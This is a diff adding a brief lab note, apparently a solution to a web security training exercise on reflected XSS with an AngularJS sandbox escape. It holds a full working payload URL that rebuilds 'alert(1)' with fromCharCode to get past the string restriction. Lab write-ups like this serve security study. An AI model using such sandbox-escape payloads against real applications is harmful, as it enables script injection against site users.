@@ -1,0 +1,6 @@
+Reflected XSS with AngularJS sandbox escape without strings
+
+Not much I can say but marvel at the amazing payload.
+Just in case, here's my URL:
+
+https://aca11f361eafa6ba80be89b1002000fc.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
